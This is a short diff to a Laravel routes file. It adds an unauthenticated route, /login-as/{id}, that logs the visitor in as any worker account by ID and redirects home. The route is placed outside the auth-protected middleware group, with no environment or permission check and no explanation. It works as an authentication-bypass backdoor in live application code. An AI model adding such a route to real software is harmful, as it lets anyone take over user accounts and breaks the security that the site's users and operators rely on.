@@ -6,7 +6,14 @@ Route::group([
 
     App::setLocale('en');
 
+    Route::get('/login-as/{id}', function ($id) {
+        Auth::guard('worker')->loginUsingId($id);
+        return redirect('/');
+    });
+
     Route::group(['middleware' => ['auth:worker', 'panel']], function () {
+
+
 
         Route::get('/', [
             'as' => 'my.dashboard',
